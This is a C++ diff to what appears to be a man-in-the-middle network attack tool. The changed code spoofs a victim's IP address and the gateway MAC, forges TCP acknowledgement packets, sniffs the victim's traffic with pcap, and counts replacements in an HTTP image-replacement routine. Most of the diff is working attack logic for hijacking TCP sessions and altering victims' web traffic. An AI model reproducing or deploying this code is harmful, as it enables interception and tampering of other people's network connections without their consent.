@@ -1,6 +1,7 @@
 #include "stdafx.h"
 #include "MITM.h"
 #include <thread>
+#include <string>
 #include "Helper.h"
 #include "Packet.h"
 
@@ -53,56 +54,56 @@ public:
 		///////////////////////////////////////////////////////////////////////////////////
 		// receive image, you can write it to a file
 		{
-			std::unique_ptr<BYTE[]> ackPkt(new BYTE[ETH_LENGTH + ipLen + tcpLen]);
-			*(MacAddress*)ackPkt.get() = g_gatewayMac;
-			*(MacAddress*)(ackPkt.get() + 6) = g_selfMac;
-			memcpy(ackPkt.get() + 12, link.initPacket.get() + 12, 2 + ipLen + tcpLen);
-			IPPacket* pAckIp = (IPPacket*)(ackPkt.get() + ETH_LENGTH);
+		std::unique_ptr<BYTE[]> ackPkt(new BYTE[ETH_LENGTH + ipLen + tcpLen]);
+		*(MacAddress*)ackPkt.get() = g_gatewayMac;
+		*(MacAddress*)(ackPkt.get() + 6) = g_selfMac;
+		memcpy(ackPkt.get() + 12, link.initPacket.get() + 12, 2 + ipLen + tcpLen);
+		IPPacket* pAckIp = (IPPacket*)(ackPkt.get() + ETH_LENGTH);
+		pAckIp->identification = htons(ntohs(pAckIp->identification) + 1);
+		pAckIp->totalLen = htons((WORD)(ipLen + tcpLen));
+		pAckIp->timeToLive = 64;
+		pAckIp->sourceIp = targetIp;
+		pAckIp->destinationIp = pInitIp->sourceIp;
+		pAckIp->CalcCheckSum();
+		TCPPacket* pAckTcp = (TCPPacket*)(ackPkt.get() + ETH_LENGTH + ipLen);
+		pAckTcp->sourcePort = targetPort;
+		pAckTcp->destinationPort = pInitTcp->sourcePort;
+		pAckTcp->seq = pInitTcp->ack;
+		pAckTcp->ack = htonl(ntohl(pInitTcp->seq) + (link.initPacketLen - ETH_LENGTH - ipLen - tcpLen));
+		pAckTcp->psh = 0;
+		pAckTcp->CalcCheckSum(pAckIp->sourceIp, pAckIp->destinationIp, (WORD)tcpLen);
+		pcap_sendpacket(adapter.get(), (u_char*)ackPkt.get(), ETH_LENGTH + sizeof(IPPacket)+sizeof(TCPPacket));
+
+		CString exp;
+		BYTE* bIp = (BYTE*)&target.ip;
+		exp.Format("ip host %u.%u.%u.%u and tcp dst port %u", bIp[0], bIp[1], bIp[2], bIp[3], ntohs(targetPort));
+		SetFilter(adapter.get(), exp);
+		DWORD time = GetTickCount();
+		pcap_pkthdr* header;
+		const BYTE* pkt_data;
+		int res;
+		DWORD lastAck = ntohl(pAckTcp->ack);
+		while ((res = pcap_next_ex(adapter.get(), &header, &pkt_data)) >= 0 && GetTickCount() - time < 5000)
+		{
+			if (res == 0) // timeout
+				continue;
+
+			const IPPacket* pCurIp = (const IPPacket*)&pkt_data[ETH_LENGTH];
+			DWORD curIpLength = pCurIp->headerLen * 4;
+			const TCPPacket* pCurTcp = (const TCPPacket*)&pkt_data[ETH_LENGTH + curIpLength];
+			DWORD curTcpLength = pCurTcp->headerLen * 4;
+
 			pAckIp->identification = htons(ntohs(pAckIp->identification) + 1);
-			pAckIp->totalLen = htons((WORD)(ipLen + tcpLen));
-			pAckIp->timeToLive = 64;
-			pAckIp->sourceIp = targetIp;
-			pAckIp->destinationIp = pInitIp->sourceIp;
 			pAckIp->CalcCheckSum();
-			TCPPacket* pAckTcp = (TCPPacket*)(ackPkt.get() + ETH_LENGTH + ipLen);
-			pAckTcp->sourcePort = targetPort;
-			pAckTcp->destinationPort = pInitTcp->sourcePort;
-			pAckTcp->seq = pInitTcp->ack;
-			pAckTcp->ack = htonl(ntohl(pInitTcp->seq) + (link.initPacketLen - ETH_LENGTH - ipLen - tcpLen));
-			pAckTcp->psh = 0;
+			DWORD ack = ntohl(pCurTcp->seq) + (header->len - ETH_LENGTH - curIpLength - curTcpLength);
+			if (lastAck < ack)
+				lastAck = ack;
+			pAckTcp->ack = htonl(lastAck);
 			pAckTcp->CalcCheckSum(pAckIp->sourceIp, pAckIp->destinationIp, (WORD)tcpLen);
 			pcap_sendpacket(adapter.get(), (u_char*)ackPkt.get(), ETH_LENGTH + sizeof(IPPacket)+sizeof(TCPPacket));
-
-			CString exp;
-			BYTE* bIp = (BYTE*)&target.ip;
-			exp.Format("ip host %u.%u.%u.%u and tcp dst port %u", bIp[0], bIp[1], bIp[2], bIp[3], ntohs(targetPort));
-			SetFilter(adapter.get(), exp);
-			DWORD time = GetTickCount();
-			pcap_pkthdr* header;
-			const BYTE* pkt_data;
-			int res;
-			DWORD lastAck = ntohl(pAckTcp->ack);
-			while ((res = pcap_next_ex(adapter.get(), &header, &pkt_data)) >= 0 && GetTickCount() - time < 5000)
-			{
-				if (res == 0) // timeout
-					continue;
-
-				const IPPacket* pCurIp = (const IPPacket*)&pkt_data[ETH_LENGTH];
-				DWORD curIpLength = pCurIp->headerLen * 4;
-				const TCPPacket* pCurTcp = (const TCPPacket*)&pkt_data[ETH_LENGTH + curIpLength];
-				DWORD curTcpLength = pCurTcp->headerLen * 4;
-
-				pAckIp->identification = htons(ntohs(pAckIp->identification) + 1);
-				pAckIp->CalcCheckSum();
-				DWORD ack = ntohl(pCurTcp->seq) + (header->len - ETH_LENGTH - curIpLength - curTcpLength);
-				if (lastAck < ack)
-					lastAck = ack;
-				pAckTcp->ack = htonl(lastAck);
-				pAckTcp->CalcCheckSum(pAckIp->sourceIp, pAckIp->destinationIp, (WORD)tcpLen);
-				pcap_sendpacket(adapter.get(), (u_char*)ackPkt.get(), ETH_LENGTH + sizeof(IPPacket)+sizeof(TCPPacket));
-				if (pCurTcp->psh)
-					break;
-			}
+			if (pCurTcp->psh)
+				break;
+		}
 		}
 		///////////////////////////////////////////////////////////////////////////////////
 #pragma endregion
@@ -309,6 +310,7 @@ void PacketHandleThread()
 
 				
 			// replace image
+			target.replace++;
 			target.httpImageLinkLock.lock();
 			auto& link = target.httpImageLink[pTcp->destinationPort];
 			target.httpImageLinkLock.unlock();
